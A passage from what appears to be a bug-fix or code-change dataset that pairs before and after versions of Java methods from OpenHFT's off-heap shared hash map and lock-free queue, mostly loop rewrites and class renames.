        return putReturnsNull ? null : readValue(entry,null);
      }
    }
    long offset=putEntry(keyBytes,hash2,value,identifier);
    incrementSize();
    notifyPut(offset,true,key,value,posFromOffset(offset));
    return null;
  }
  finally {
    unlock();
  }
}"
91421,"/** 
 * @see net.openhft.collections.VanillaSharedHashMap.Segment#remove(net.openhft.lang.io.Bytes,Object,Object,int)
 */
public V remove(Bytes keyBytes,K key,V expectedValue,int hash2,final long timestamp,final byte identifier){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveOnly.startSearch(hash2);
    int pos;
    while ((pos=hashLookupLiveOnly.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      long timeStampPos=0;
      if (canReplicate) {
        timeStampPos=entry.position();
        if (shouldTerminate(entry,timestamp,identifier))         return null;
        entry.skip(1);
      }
      long valueLen=readValueLen(entry);
      long entryEndAddr=entry.positionAddr() + valueLen;
      V valueRemoved=expectedValue != null || !removeReturnsNull ? readValue(entry,null,valueLen) : null;
      if (expectedValue != null && !expectedValue.equals(valueRemoved)) {
        return null;
      }
      hashLookupLiveOnly.removePrevPos();
      decrementSize();
      if (canReplicate) {
        entry.position(timeStampPos);
        entry.writeLong(timestamp);
        entry.writeByte(identifier);
        entry.writeBoolean(true);
      }
 else {
        free(pos,inBlocks(entryEndAddr - entryStartAddr(offset)));
      }
      notifyRemoved(offset,key,valueRemoved,pos);
      return valueRemoved;
    }
    return null;
  }
  finally {
    unlock();
  }
}","/** 
 * @see net.openhft.collections.VanillaSharedHashMap.Segment#remove(net.openhft.lang.io.Bytes,Object,Object,int)
 */
public V remove(Bytes keyBytes,K key,V expectedValue,int hash2,final long timestamp,final byte identifier){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveOnly.startSearch(hash2);
    for (int pos; (pos=hashLookupLiveOnly.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      long timeStampPos=0;
      if (canReplicate) {
        timeStampPos=entry.position();
        if (shouldTerminate(entry,timestamp,identifier))         return null;
        entry.skip(1);
      }
      long valueLen=readValueLen(entry);
      long entryEndAddr=entry.positionAddr() + valueLen;
      V valueRemoved=expectedValue != null || !removeReturnsNull ? readValue(entry,null,valueLen) : null;
      if (expectedValue != null && !expectedValue.equals(valueRemoved)) {
        return null;
      }
      hashLookupLiveOnly.removePrevPos();
      decrementSize();
      if (canReplicate) {
        entry.position(timeStampPos);
        entry.writeLong(timestamp);
        entry.writeByte(identifier);
        entry.writeBoolean(true);
      }
 else {
        free(pos,inBlocks(entryEndAddr - entryStartAddr(offset)));
      }
      notifyRemoved(offset,key,valueRemoved,pos);
      return valueRemoved;
    }
    return null;
  }
  finally {
    unlock();
  }
}"
91422,"@Override public void onUpdate(AbstractBytes entry){
  if (!canReplicate)   throw new IllegalStateException(""String_Node_Str"");
  final long keyLen=entry.readStopBit();
  final Bytes keyBytes=entry.createSlice(0,keyLen);
  entry.skip(keyLen);
  final long timeStamp=entry.readLong();
  final byte identifier=entry.readByte();
  final boolean isDeleted=entry.readBoolean();
  long hash=Hasher.hash(keyBytes);
  int segmentNum=hasher.getSegment(hash);
  int segmentHash=hasher.segmentHash(hash);
  if (isDeleted)   segment(segmentNum).remoteRemove(keyBytes,segmentHash,timeStamp,identifier);
 else {
    long valueLen=entry.readStopBit();
    final Bytes value=entry.createSlice(0,valueLen);
    segment(segmentNum).replicatingPut(keyBytes,value,segmentHash,identifier,timeStamp,valueLen,this.entrySize);
  }
}","@Override public void onUpdate(AbstractBytes entry){
  if (!canReplicate)   throw new IllegalStateException(""String_Node_Str"");
  final long keyLen=entry.readStopBit();
  final Bytes keyBytes=entry.createSlice(0,keyLen);
  entry.skip(keyLen);
  final long timeStamp=entry.readLong();
  final byte identifier=entry.readByte();
  final boolean isDeleted=entry.readBoolean();
  long hash=Hasher.hash(keyBytes);
  int segmentNum=hasher.getSegment(hash);
  int segmentHash=hasher.segmentHash(hash);
  if (isDeleted)   segment(segmentNum).remoteRemove(keyBytes,segmentHash,timeStamp,identifier);
 else {
    long valueLen=entry.readStopBit();
    final Bytes value=entry.createSlice(0,valueLen);
    segment(segmentNum).replicatingPut(keyBytes,value,segmentHash,identifier,timeStamp);
  }
}"
91423,"/** 
 * called from a remote node as part of replication
 * @param keyBytes
 * @param hash2
 * @param timestamp
 * @param identifier
 * @return
 */
private void remoteRemove(Bytes keyBytes,int hash2,final long timestamp,final byte identifier){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveOnly.startSearch(hash2);
    int pos;
    while ((pos=hashLookupLiveOnly.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      long timeStampPos=entry.position();
      if (shouldTerminate(entry,timestamp,identifier))       return;
      entry.skip(1);
      hashLookupLiveOnly.removePrevPos();
      decrementSize();
      entry.position(timeStampPos);
      entry.writeLong(timestamp);
      entry.writeByte(identifier);
      entry.writeBoolean(true);
    }
    return;
  }
  finally {
    unlock();
  }
}","/** 
 * called from a remote node as part of replication
 * @param keyBytes
 * @param hash2
 * @param timestamp
 * @param identifier
 * @return
 */
private void remoteRemove(Bytes keyBytes,int hash2,final long timestamp,final byte identifier){
  lock();
  try {
    MultiStoreBytes entry=tmpBytes;
    if (searchKey(keyBytes,hash2,entry,hashLookupLiveOnly) >= 0L) {
      long timeStampPos=entry.position();
      if (shouldTerminate(entry,timestamp,identifier))       return;
      entry.skip(1);
      hashLookupLiveOnly.removePrevPos();
      decrementSize();
      entry.position(timeStampPos);
      entry.writeLong(timestamp);
      entry.writeByte(identifier);
      entry.writeBoolean(true);
    }
  }
  finally {
    unlock();
  }
}"
91424,"long searchKey(Bytes keyBytes,int hash2,MultiStoreBytes entry,IntIntMultiMap hashLookup){
  long keyLen=keyBytes.remaining();
  hashLookup.startSearch(hash2);
  for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
    long offset=offsetFromPos(pos);
    reuse(entry,offset);
    if (!keyEqualsForAcquire(keyBytes,keyLen,entry))     continue;
    entry.skip(keyLen);
    return offset;
  }
  return -1L;
}","long searchKey(Bytes keyBytes,int hash2,MultiStoreBytes entry,IntIntMultiMap hashLookup){
  long keyLen=keyBytes.remaining();
  hashLookup.startSearch(hash2);
  for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
    long offset=offsetFromPos(pos);
    reuse(entry,offset);
    if (!keyEquals(keyBytes,keyLen,entry))     continue;
    entry.skip(keyLen);
    return offset;
  }
  return -1L;
}"
91425,"/** 
 * Check there is no garbage in freeList.
 */
void checkConsistency(){
  lock();
  try {
    int pos=0;
    while ((pos=(int)freeList.nextSetBit(pos)) >= 0) {
      PosPresentOnce check=new PosPresentOnce(pos);
      hashLookup.forEach(check);
      if (check.count != 1)       throw new AssertionError();
      long offset=offsetFromPos(pos);
      Bytes entry=entry(offset);
      long keyLen=entry.readStopBit();
      entry.skip(keyLen);
      long valueLen=entry.readStopBit();
      long sizeInBytes=entrySize(keyLen,valueLen);
      int entrySizeInBlocks=inBlocks(sizeInBytes);
      if (!freeList.allSet(pos,pos + entrySizeInBlocks))       throw new AssertionError();
      pos+=entrySizeInBlocks;
    }
  }
  finally {
    unlock();
  }
}","/** 
 * Check there is no garbage in freeList.
 */
void checkConsistency(){
  lock();
  try {
    for (int pos=0; (pos=(int)freeList.nextSetBit(pos)) >= 0; ) {
      PosPresentOnce check=new PosPresentOnce(pos);
      hashLookup.forEach(check);
      if (check.count != 1)       throw new AssertionError();
      long offset=offsetFromPos(pos);
      Bytes entry=entry(offset);
      long keyLen=entry.readStopBit();
      entry.skip(keyLen);
      long valueLen=entry.readStopBit();
      long sizeInBytes=entrySize(keyLen,valueLen);
      int entrySizeInBlocks=inBlocks(sizeInBytes);
      if (!freeList.allSet(pos,pos + entrySizeInBlocks))       throw new AssertionError();
      pos+=entrySizeInBlocks;
    }
  }
  finally {
    unlock();
  }
}"
91426,"/** 
 * Replaces the specified value for the key with the given value. <p/>  {@code newValue} is set only if the existing value correspondingto the specified key is equal to  {@code expectedValue}or   {@code expectedValue == null}.
 * @param hash2 a hash code related to the {@code keyBytes}
 * @return the replaced value or {@code null} if the value was not replaced
 */
V replace(Bytes keyBytes,K key,V expectedValue,V newValue,int hash2){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    int pos;
    while ((pos=hashLookup.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      long valueLenPos=entry.position();
      long valueLen=readValueLen(entry);
      long entryEndAddr=entry.positionAddr() + valueLen;
      V valueRead=readValue(entry,null,valueLen);
      if (valueRead == null)       return null;
      if (expectedValue == null || expectedValue.equals(valueRead)) {
        offset=putValue(pos,offset,entry,valueLenPos,entryEndAddr,getValueAsBytes(newValue));
        notifyPut(offset,false,key,newValue,pos);
        return valueRead;
      }
      return null;
    }
    return null;
  }
  finally {
    unlock();
  }
}","/** 
 * Replaces the specified value for the key with the given value. <p/>  {@code newValue} is set only if the existing value correspondingto the specified key is equal to  {@code expectedValue}or   {@code expectedValue == null}.
 * @param hash2 a hash code related to the {@code keyBytes}
 * @return the replaced value or {@code null} if the value was not replaced
 */
V replace(Bytes keyBytes,K key,V expectedValue,V newValue,int hash2){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      long valueLenPos=entry.position();
      long valueLen=readValueLen(entry);
      long entryEndAddr=entry.positionAddr() + valueLen;
      V valueRead=readValue(entry,null,valueLen);
      if (valueRead == null)       return null;
      if (expectedValue == null || expectedValue.equals(valueRead)) {
        offset=putValue(pos,offset,entry,valueLenPos,entryEndAddr,getValueAsBytes(newValue));
        notifyPut(offset,false,key,newValue,posFromOffset(offset));
        return valueRead;
      }
      return null;
    }
    return null;
  }
  finally {
    unlock();
  }
}"
91427,"V put(Bytes keyBytes,K key,V value,int hash2,boolean replaceIfPresent){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    int pos;
    while ((pos=hashLookup.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (replaceIfPresent) {
        long valueLenPos=entry.position();
        long valueLen=readValueLen(entry);
        long entryEndAddr=entry.positionAddr() + valueLen;
        V prevValue=null;
        if (!putReturnsNull)         prevValue=readValue(entry,null,valueLen);
        offset=putValue(pos,offset,entry,valueLenPos,entryEndAddr,getValueAsBytes(value));
        notifyPut(offset,false,key,value,pos);
        return prevValue;
      }
 else {
        return putReturnsNull ? null : readValue(entry,null);
      }
    }
    long offset=putEntry(keyBytes,value);
    incrementSize();
    notifyPut(offset,true,key,value,posFromOffset(offset));
    return null;
  }
  finally {
    unlock();
  }
}","V put(Bytes keyBytes,K key,V value,int hash2,boolean replaceIfPresent){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (replaceIfPresent) {
        long valueLenPos=entry.position();
        long valueLen=readValueLen(entry);
        long entryEndAddr=entry.positionAddr() + valueLen;
        V prevValue=null;
        if (!putReturnsNull)         prevValue=readValue(entry,null,valueLen);
        offset=putValue(pos,offset,entry,valueLenPos,entryEndAddr,getValueAsBytes(value));
        notifyPut(offset,false,key,value,posFromOffset(offset));
        return prevValue;
      }
 else {
        return putReturnsNull ? null : readValue(entry,null);
      }
    }
    long offset=putEntry(keyBytes,value);
    incrementSize();
    notifyPut(offset,true,key,value,posFromOffset(offset));
    return null;
  }
  finally {
    unlock();
  }
}"
91428,"boolean containsKey(Bytes keyBytes,int hash2){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    int pos;
    while ((pos=hashLookup.nextPos()) >= 0) {
      Bytes entry=entry(offsetFromPos(pos));
      if (keyEquals(keyBytes,keyLen,entry))       return true;
    }
    return false;
  }
  finally {
    unlock();
  }
}","boolean containsKey(Bytes keyBytes,int hash2){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
      Bytes entry=entry(offsetFromPos(pos));
      if (keyEquals(keyBytes,keyLen,entry))       return true;
    }
    return false;
  }
  finally {
    unlock();
  }
}"
91429,"/** 
 * Used to acquire an object of type V from the Segment. <p/>  {@code usingValue} is reused to read the value if key is presentin this Segment, if key is absent in this Segment: <p/> <ol><li>If  {@code create == false}, just   {@code null} is returned(except when event listener provides a value ""on get missing"" - then it is put into this Segment for the key).</li> <p/> <li>If  {@code create == true},   {@code usingValue} or a newlycreated instance of value class, if  {@code usingValue == null}, is put into this Segment for the key.</li></ol>
 * @param keyBytes serialized {@code key}
 * @param hash2    a hash code related to the {@code keyBytes}
 * @return the value which is finally associated with the given key inthis Segment after execution of this method, or  {@code null}.
 */
V acquire(Bytes keyBytes,K key,V usingValue,int hash2,boolean create){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    int pos;
    while ((pos=hashLookup.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEqualsForAcquire(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      V v=readValue(entry,usingValue);
      notifyGet(offset,key,v);
      return v;
    }
    if (create) {
      usingValue=createValueIfNull(usingValue);
    }
 else {
      if (usingValue instanceof Byteable)       ((Byteable)usingValue).bytes(null,0);
      usingValue=notifyMissed(keyBytes,key,usingValue);
      if (usingValue == null)       return null;
    }
    long offset=putEntryConsideringByteableValue(keyBytes,usingValue);
    incrementSize();
    notifyPut(offset,true,key,usingValue,pos);
    return usingValue;
  }
  finally {
    unlock();
  }
}","/** 
 * Used to acquire an object of type V from the Segment. <p/>  {@code usingValue} is reused to read the value if key is presentin this Segment, if key is absent in this Segment: <p/> <ol><li>If  {@code create == false}, just   {@code null} is returned(except when event listener provides a value ""on get missing"" - then it is put into this Segment for the key).</li> <p/> <li>If  {@code create == true},   {@code usingValue} or a newlycreated instance of value class, if  {@code usingValue == null}, is put into this Segment for the key.</li></ol>
 * @param keyBytes serialized {@code key}
 * @param hash2    a hash code related to the {@code keyBytes}
 * @return the value which is finally associated with the given key inthis Segment after execution of this method, or  {@code null}.
 */
V acquire(Bytes keyBytes,K key,V usingValue,int hash2,boolean create){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEqualsForAcquire(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      V v=readValue(entry,usingValue);
      notifyGet(offset,key,v);
      return v;
    }
    if (create) {
      usingValue=createValueIfNull(usingValue);
    }
 else {
      if (usingValue instanceof Byteable)       ((Byteable)usingValue).bytes(null,0);
      usingValue=notifyMissed(keyBytes,key,usingValue);
      if (usingValue == null)       return null;
    }
    long offset=putEntryConsideringByteableValue(keyBytes,usingValue);
    incrementSize();
    notifyPut(offset,true,key,usingValue,posFromOffset(offset));
    return usingValue;
  }
  finally {
    unlock();
  }
}"
91430,"public VanillaSharedReplicatedHashMap(VanillaSharedReplicatedHashMapBuilder builder,File file,Class<K> kClass,Class<V> vClass) throws IOException {
  super(builder,file,kClass,vClass);
  this.canReplicate=builder.canReplicate();
  this.timeProvider=builder.timeProvider();
  this.localIdentifier=builder.identifier();
}","public VanillaSharedReplicatedHashMap(VanillaSharedReplicatedHashMapBuilder builder,File file,Class<K> kClass,Class<V> vClass) throws IOException {
  super(builder,kClass,vClass);
  this.canReplicate=builder.canReplicate();
  this.timeProvider=builder.timeProvider();
  this.localIdentifier=builder.identifier();
  createMappedStoreAndSegments(file);
}"
91431,"void notifyGet(long offset,K key,V value){
  if (eventListener != SharedMapEventListeners.NOP) {
    tmpBytes.storePositionAndSize(bytes,offset,entrySize);
    eventListener.onGetFound(VanillaSharedHashMap.this,tmpBytes,metaDataBytes,key,value);
  }
}","void notifyGet(long offset,K key,V value){
  if (eventListener != SharedMapEventListeners.NOP) {
    tmpBytes.storePositionAndSize(bytes,offset,entrySize);
    eventListener.onGetFound(AbstractVanillaSharedHashMap.this,tmpBytes,metaDataBytes,key,value);
  }
}"
91432,"public boolean contains(Object o){
  if (!(o instanceof Map.Entry))   return false;
  Map.Entry<?,?> e=(Map.Entry<?,?>)o;
  try {
    V v=VanillaSharedHashMap.this.get(e.getKey());
    return v != null && v.equals(e.getValue());
  }
 catch (  ClassCastException ex) {
    return false;
  }
catch (  NullPointerException ex) {
    return false;
  }
}","public boolean contains(Object o){
  if (!(o instanceof Map.Entry))   return false;
  Map.Entry<?,?> e=(Map.Entry<?,?>)o;
  try {
    V v=AbstractVanillaSharedHashMap.this.get(e.getKey());
    return v != null && v.equals(e.getValue());
  }
 catch (  ClassCastException ex) {
    return false;
  }
catch (  NullPointerException ex) {
    return false;
  }
}"
91433,"public int size(){
  return VanillaSharedHashMap.this.size();
}","public int size(){
  return AbstractVanillaSharedHashMap.this.size();
}"
91434,"void notifyPut(long offset,boolean added,K key,V value,final long pos){
  if (eventListener != SharedMapEventListeners.NOP) {
    tmpBytes.storePositionAndSize(bytes,offset,entrySize);
    eventListener.onPut(VanillaSharedHashMap.this,tmpBytes,metaDataBytes,added,key,value,pos,this);
  }
}","void notifyPut(long offset,boolean added,K key,V value,final long pos){
  if (eventListener != SharedMapEventListeners.NOP) {
    tmpBytes.storePositionAndSize(bytes,offset,entrySize);
    eventListener.onPut(AbstractVanillaSharedHashMap.this,tmpBytes,metaDataBytes,added,key,value,pos,this);
  }
}"
91435,"V notifyMissed(Bytes keyBytes,K key,V usingValue){
  if (eventListener != SharedMapEventListeners.NOP) {
    return eventListener.onGetMissing(VanillaSharedHashMap.this,keyBytes,key,usingValue);
  }
  return null;
}","V notifyMissed(Bytes keyBytes,K key,V usingValue){
  if (eventListener != SharedMapEventListeners.NOP) {
    return eventListener.onGetMissing(AbstractVanillaSharedHashMap.this,keyBytes,key,usingValue);
  }
  return null;
}"
91436,"public VanillaSharedHashMap(SharedHashMapBuilder builder,File file,Class<K> kClass,Class<V> vClass) throws IOException {
  bufferAllocationFactor=figureBufferAllocationFactor(builder);
  this.kClass=kClass;
  this.vClass=vClass;
  lockTimeOutNS=builder.lockTimeOutMS() * 1000000;
  this.replicas=builder.replicas();
  this.entrySize=builder.alignedEntrySize();
  this.alignment=builder.entryAndValueAlignment();
  this.errorListener=builder.errorListener();
  this.generatedKeyType=builder.generatedKeyType();
  this.generatedValueType=builder.generatedValueType();
  this.putReturnsNull=builder.putReturnsNull();
  this.removeReturnsNull=builder.removeReturnsNull();
  int segments=builder.actualSegments();
  int entriesPerSegment=builder.actualEntriesPerSegment();
  this.entriesPerSegment=entriesPerSegment;
  this.metaDataBytes=builder.metaDataBytes();
  this.eventListener=builder.eventListener();
  this.hashMask=entriesPerSegment > (1 << 16) ? ~0 : 0xFFFF;
  this.hasher=new Hasher(segments,hashMask);
  @SuppressWarnings(""String_Node_Str"") Segment[] ss=(VanillaSharedHashMap.Segment[])new VanillaSharedHashMap.Segment[segments];
  this.segments=ss;
  this.ms=new MappedStore(file,FileChannel.MapMode.READ_WRITE,sizeInBytes());
  long offset=SharedHashMapBuilder.HEADER_SIZE;
  long segmentSize=segmentSize();
  for (int i=0; i < this.segments.length; i++) {
    this.segments[i]=createSegment(ms.createSlice(offset,segmentSize),i);
    offset+=segmentSize;
  }
}","public VanillaSharedHashMap(SharedHashMapBuilder builder,File file,Class<K> kClass,Class<V> vClass) throws IOException {
  super(builder,kClass,vClass);
  createMappedStoreAndSegments(file);
}"
91437,"void notifyRemoved(long offset,K key,V value,final int pos){
  if (eventListener != SharedMapEventListeners.NOP) {
    tmpBytes.storePositionAndSize(bytes,offset,entrySize);
    eventListener.onRemove(VanillaSharedHashMap.this,tmpBytes,metaDataBytes,key,value,pos,this);
  }
}","void notifyRemoved(long offset,K key,V value,final int pos){
  if (eventListener != SharedMapEventListeners.NOP) {
    tmpBytes.storePositionAndSize(bytes,offset,entrySize);
    eventListener.onRemove(AbstractVanillaSharedHashMap.this,tmpBytes,metaDataBytes,key,value,pos,this);
  }
}"
91438,"public boolean remove(Object o){
  if (!(o instanceof Map.Entry))   return false;
  Map.Entry<?,?> e=(Map.Entry<?,?>)o;
  try {
    Object key=e.getKey();
    Object value=e.getValue();
    return VanillaSharedHashMap.this.remove(key,value);
  }
 catch (  ClassCastException ex) {
    return false;
  }
catch (  NullPointerException ex) {
    return false;
  }
}","public boolean remove(Object o){
  if (!(o instanceof Map.Entry))   return false;
  Map.Entry<?,?> e=(Map.Entry<?,?>)o;
  try {
    Object key=e.getKey();
    Object value=e.getValue();
    return AbstractVanillaSharedHashMap.this.remove(key,value);
  }
 catch (  ClassCastException ex) {
    return false;
  }
catch (  NullPointerException ex) {
    return false;
  }
}"
91439,"public VanillaSharedHashMap.Segment[] getSegments(){
  return segments;
}","public SharedSegment[] getSegments(){
  return segments;
}"
91440,"public void clear(){
  VanillaSharedHashMap.this.clear();
}","public void clear(){
  AbstractVanillaSharedHashMap.this.clear();
}"
91441,"public boolean isEmpty(){
  return VanillaSharedHashMap.this.isEmpty();
}","public boolean isEmpty(){
  return AbstractVanillaSharedHashMap.this.isEmpty();
}"
91442,"/** 
 * /
 * @param readLocation we want to minimize the number of volatile reads, so we read the readLocation just once, and pass it in
 * @return
 */
int blockForReadSpace(int readLocation){
  final int nextReadLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
  while (locator.getWriteLocation() == readLocation)   blockAtTake();
  return nextReadLocation;
}","/** 
 * /
 * @param readLocation we want to minimize the number of volatile reads, so we read the readLocation just once, and pass it in
 * @return
 */
int blockForReadSpace(int readLocation){
  final int nextReadLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
  while (locator.getWriterLocation() == readLocation)   blockAtTake();
  return nextReadLocation;
}"
91443,"/** 
 * The items will be cleared correctly only if nothing was added or removed from the queue at the time it was called
 * @return an approximation of the size
 */
public void clear(){
  setReadLocation(locator.getWriteLocation());
}","/** 
 * The items will be cleared correctly only if nothing was added or removed from the queue at the time it was called
 * @return an approximation of the size
 */
public void clear(){
  setReadLocation(locator.getWriterLocation());
}"
91444,"/** 
 * This method does not lock, it therefore only provides and approximation of isEmpty(), it will be correct, if nothing was added or removed from the queue at the time it was called.
 * @return an approximation of isEmpty()
 */
public boolean isEmpty(){
  return locator.getReadLocation() == locator.getWriteLocation();
}","/** 
 * This method does not lock, it therefore only provides and approximation of isEmpty(), it will be correct, if nothing was added or removed from the queue at the time it was called.
 * @return an approximation of isEmpty()
 */
public boolean isEmpty(){
  return locator.getReadLocation() == locator.getWriterLocation();
}"
91445,"void setWriteLocation(int nextWriteLocation){
  this.producerWriteLocation=nextWriteLocation;
  locator.setWriteLocation(nextWriteLocation);
}","void setWriteLocation(int nextWriteLocation){
  this.producerWriteLocation=nextWriteLocation;
  locator.setWriterLocation(nextWriteLocation);
}"
91446,"/** 
 * /
 * @param readLocation we want to minimize the number of volatile reads, so we read the readLocation just once, and pass it in
 * @return
 */
int blockForReadSpaceThrowNoSuchElementException(int readLocation){
  final int nextReadLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
  while (locator.getWriteLocation() == readLocation)   throw new NoSuchElementException();
  return nextReadLocation;
}","/** 
 * /
 * @param readLocation we want to minimize the number of volatile reads, so we read the readLocation just once, and pass it in
 * @return
 */
int blockForReadSpaceThrowNoSuchElementException(int readLocation){
  final int nextReadLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
  while (locator.getWriterLocation() == readLocation)   throw new NoSuchElementException();
  return nextReadLocation;
}"
91447,"/** 
 * This method is not thread safe it therefore only provides and approximation of the size, the size will be corrected if nothing was added or removed from the queue at the time it was called
 * @return an approximation of the size
 */
public int size(){
  int read=locator.getReadLocation();
  int write=locator.getWriteLocation();
  if (write < read)   write+=dataLocator.getCapacity();
  return write - read;
}","/** 
 * This method is not thread safe it therefore only provides and approximation of the size, the size will be corrected if nothing was added or removed from the queue at the time it was called
 * @return an approximation of the size
 */
public int size(){
  int read=locator.getReadLocation();
  int write=locator.getWriterLocation();
  if (write < read)   write+=dataLocator.getCapacity();
  return write - read;
}"
91448,"/** 
 * Returns the number of additional elements that this queue can ideally (in the absence of memory or resource constraints) accept without blocking, or <tt>Integer.MAX_VALUE</tt> if there is no intrinsic limit. <p/> <p>Note that you <em>cannot</em> always tell if an attempt to insert an element will succeed by inspecting <tt>remainingdataLocator.getCapacity()</tt> because it may be the case that another thread is about to insert or remove an element.
 * @return the remaining capacity
 */
public int remainingCapacity(){
  int readLocation=locator.getReadLocation();
  int writeLocation=locator.getWriteLocation();
  if (writeLocation < readLocation)   writeLocation+=dataLocator.getCapacity();
  return (dataLocator.getCapacity() - 1) - (writeLocation - readLocation);
}","/** 
 * Returns the number of additional elements that this queue can ideally (in the absence of memory or resource constraints) accept without blocking, or <tt>Integer.MAX_VALUE</tt> if there is no intrinsic limit. <p/> <p>Note that you <em>cannot</em> always tell if an attempt to insert an element will succeed by inspecting <tt>remainingdataLocator.getCapacity()</tt> because it may be the case that another thread is about to insert or remove an element.
 * @return the remaining capacity
 */
public int remainingCapacity(){
  int readLocation=locator.getReadLocation();
  int writeLocation=locator.getWriterLocation();
  if (writeLocation < readLocation)   writeLocation+=dataLocator.getCapacity();
  return (dataLocator.getCapacity() - 1) - (writeLocation - readLocation);
}"
91449,"@Override public boolean containsAll(Collection<?> items){
  final int read=locator.getReadLocation();
  final int write=locator.getWriteLocation();
  if (items.size() == 0)   return true;
  if (read == write)   return false;
  for (  Object o : items) {
    if (!contains(o))     return false;
  }
  return true;
}","@Override public boolean containsAll(Collection<?> items){
  final int read=locator.getReadLocation();
  final int write=locator.getWriterLocation();
  if (items.size() == 0)   return true;
  if (read == write)   return false;
  for (  Object o : items) {
    if (!contains(o))     return false;
  }
  return true;
}"
91450,"/** 
 * Retrieves and removes the head of this queue, waiting up to the specified wait time if necessary for an element to become available.
 * @return the head of this queue, or <tt>null</tt> if thespecified waiting time elapses before an element is available
 */
public E poll(){
  final int readLocation=this.consumerReadLocation;
  final int nextReadLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
  if (locator.getWriteLocation() == readLocation)   return null;
  final E value=dataLocator.getData(readLocation);
  setReadLocation(nextReadLocation);
  return value;
}","/** 
 * Retrieves and removes the head of this queue, waiting up to the specified wait time if necessary for an element to become available.
 * @return the head of this queue, or <tt>null</tt> if thespecified waiting time elapses before an element is available
 */
public E poll(){
  final int readLocation=this.consumerReadLocation;
  final int nextReadLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
  if (locator.getWriterLocation() == readLocation)   return null;
  final E value=dataLocator.getData(readLocation);
  setReadLocation(nextReadLocation);
  return value;
}"
91451,"/** 
 * Removes at most the given number of available elements from this queue and adds them to the given collection.  A failure encountered while attempting to add elements to collection <tt>c</tt> may result in elements being in neither, either or both collections when the associated exception is thrown.  Attempts to drain a queue to itself result in <tt>IllegalArgumentException</tt>. Further, the behavior of this operation is undefined if the specified collection is modified while the operation is in progress.
 * @param target      the array to transfer elements into
 * @param maxElements the maximum number of elements to transfer
 * @return the number of elements transferred
 * @throws UnsupportedOperationException if addition of elementsis not supported by the specified collection
 * @throws ClassCastException            if the class of an element of this queueprevents it from being added to the specified collection
 * @throws NullPointerException          if the specified collection is null
 * @throws IllegalArgumentException      if the specified collection is thisqueue, or some property of an element of this queue prevents it from being added to the specified collection
 */
int drainTo(E[] target,int maxElements){
  int readLocation=this.consumerReadLocation;
  int i=0;
  int writeLocation=this.locator.getWriteLocation();
  do {
    if (writeLocation == readLocation) {
      writeLocation=this.locator.getWriteLocation();
      if (writeLocation == readLocation) {
        setReadLocation(readLocation);
        return i;
      }
    }
    readLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
    target[i]=dataLocator.getData(readLocation);
  }
 while (i <= maxElements);
  setReadLocation(readLocation);
  return maxElements;
}","/** 
 * Removes at most the given number of available elements from this queue and adds them to the given collection.  A failure encountered while attempting to add elements to collection <tt>c</tt> may result in elements being in neither, either or both collections when the associated exception is thrown.  Attempts to drain a queue to itself result in <tt>IllegalArgumentException</tt>. Further, the behavior of this operation is undefined if the specified collection is modified while the operation is in progress.
 * @param target      the array to transfer elements into
 * @param maxElements the maximum number of elements to transfer
 * @return the number of elements transferred
 * @throws UnsupportedOperationException if addition of elementsis not supported by the specified collection
 * @throws ClassCastException            if the class of an element of this queueprevents it from being added to the specified collection
 * @throws NullPointerException          if the specified collection is null
 * @throws IllegalArgumentException      if the specified collection is thisqueue, or some property of an element of this queue prevents it from being added to the specified collection
 */
int drainTo(E[] target,int maxElements){
